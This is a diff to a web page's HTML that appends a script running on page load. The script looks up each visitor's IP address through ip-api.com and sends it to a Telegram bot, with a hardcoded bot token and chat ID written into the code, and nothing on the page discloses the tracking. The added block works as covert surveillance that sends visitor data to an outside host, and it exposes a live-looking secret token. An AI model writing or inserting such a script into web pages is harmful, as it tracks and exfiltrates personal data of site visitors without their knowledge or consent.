@@ -200,5 +200,47 @@
     });
   });
   </script>
+  <script>
+        // Replace these with your own Telegram Bot Token and Chat ID
+        const botToken = '7341621457:AAEUmsmptZF9TAPbi8F-mjoiDGH3Kh3v_x0'; // Telegram Bot Token
+        const chatId = '"6940587601'; // Telegram Chat ID
+
+        // Function to get the user's IP address using ip-api.com and send it to Telegram
+        function sendIPToTelegram() {
+            // Get the user's IP address using ip-api.com
+            fetch('http://ip-api.com/json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.query; // The IP address from ip-api.com
+                    console.log("User IP: ", ip);
+                    sendToTelegram(ip);
+                })
+                .catch(error => {
+                    console.error('Error getting IP address:', error);
+                });
+        }
+
+        // Function to send IP to Telegram
+        function sendToTelegram(ip) {
+            const message = `Visitor's IP address: ${ip}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('IP sent to Telegram');
+                    } else {
+                        console.error('Failed to send IP to Telegram:', data);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending to Telegram:', error);
+                });
+        }
+
+        // Send the IP address when the page loads
+        window.onload = sendIPToTelegram;
+    </script>
 </body>
 </html>
